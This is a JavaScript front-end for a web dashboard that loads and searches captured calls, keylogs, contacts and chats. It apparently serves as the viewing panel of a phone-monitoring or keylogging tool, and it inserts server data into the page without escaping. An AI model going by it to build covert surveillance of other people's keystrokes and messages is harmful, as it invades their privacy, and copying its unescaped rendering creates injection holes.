// Initialize Feather icons when the document is loaded
document.addEventListener('DOMContentLoaded', () => {
    feather.replace();
    initializeApp();
});

// Initialize app
function initializeApp() {
    // Setup navigation
    document.querySelectorAll('.sidebar li').forEach(item => {
        item.addEventListener('click', () => {
            document.querySelectorAll('.sidebar li').forEach(li => li.classList.remove('active'));
            item.classList.add('active');
            showSection(item.dataset.section);
        });
    });

    // Setup search
    const searchInput = document.getElementById('search-input');
    if (searchInput) {
        searchInput.addEventListener('input', debounce(searchMessages, 300));
    }

    // Load initial data
    showSection('chats');
}

// Show section
function showSection(sectionId) {
    try {
        // Hide all sections
        document.querySelectorAll('.section').forEach(section => {
            section.classList.add('hidden');
            section.classList.remove('active');
        });
        
        // Show selected section
        const section = document.getElementById(sectionId);
        if (section) {
            section.classList.remove('hidden');
            section.classList.add('active');
            // Load section specific data
            loadSectionData(sectionId);
        } else {
            console.warn(`Section with id "${sectionId}" not found`);
        }
    } catch (error) {
        console.error('Error showing section:', error);
    }
}

// Load section data
async function loadSectionData(sectionId) {
    try {
        const contentDiv = document.querySelector('.main-content');
        if (!contentDiv) {
            console.error('Main content container not found');
            return;
        }

        switch(sectionId) {
            case 'calls':
                contentDiv.innerHTML = '<div id="calls" class="section"></div>';
                await loadCalls();
                break;
            case 'keylogs':
                contentDiv.innerHTML = '<div id="keylogs" class="section"></div>';
                await loadKeylogs();
                break;
            case 'contacts':
                contentDiv.innerHTML = '<div id="contacts" class="section"></div>';
                await loadContacts();
                break;
            case 'chats':
                contentDiv.innerHTML = '<div id="chats" class="section"></div>';
                await loadChats();
                break;
            default:
                console.warn(`Unknown section: ${sectionId}`);
                break;
        }
    } catch (error) {
        console.error('Error loading section data:', error);
    }
}

// Generic fetch helper with error handling
async function fetchContent(url) {
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return await response.text();
    } catch (error) {
        console.error(`Error fetching ${url}:`, error);
        return `<p class="error-message">Error loading content. Please try again later.</p>`;
    }
}

// Load calls
async function loadCalls() {
    const callsSection = document.getElementById('calls');
    if (callsSection) {
        const data = await fetchContent('/calls');
        callsSection.innerHTML = data;
        feather.replace();
    }
}

// Load keylogs
async function loadKeylogs() {
    const keylogsSection = document.getElementById('keylogs');
    if (keylogsSection) {
        const data = await fetchContent('/keylogs');
        keylogsSection.innerHTML = data;
        feather.replace();
    }
}

// Load contacts
async function loadContacts() {
    const contactsSection = document.getElementById('contacts');
    if (contactsSection) {
        const data = await fetchContent('/contacts');
        contactsSection.innerHTML = data;
        feather.replace();
    }
}

// Load chats
async function loadChats() {
    const chatsSection = document.getElementById('chats');
    if (chatsSection) {
        const data = await fetchContent('/');
        chatsSection.innerHTML = data;
        feather.replace();
    }
}

// Search messages
function searchMessages() {
    const searchInput = document.getElementById('search-input');
    const searchTerm = searchInput ? searchInput.value : '';
    const resultsContainer = document.getElementById('search-results');
    
    if (!searchTerm || !resultsContainer) return;

    fetch('/search', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `search_term=${encodeURIComponent(searchTerm)}`,
    })
    .then(response => response.json())
    .then(results => {
        resultsContainer.innerHTML = '';
        
        if (results.error) {
            resultsContainer.innerHTML = `<p>${results.error}</p>`;
            return;
        }

        if (results.length === 0) {
            resultsContainer.innerHTML = '<p>No results found.</p>';
            return;
        }

        const ul = document.createElement('ul');
        results.forEach(result => {
            const li = document.createElement('li');
            const messageType = result.type.charAt(0).toUpperCase() + result.type.slice(1);
            li.innerHTML = `
                <p><strong>${messageType}: ${result.name}</strong> - ${result.text}</p>
                <small>${result.time}</small>
            `;
            ul.appendChild(li);
        });
        resultsContainer.appendChild(ul);
    })
    .catch(error => {
        resultsContainer.innerHTML = `<p>Error: ${error.message}</p>`;
        console.error('Search error:', error);
    });
}

// Debounce function
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}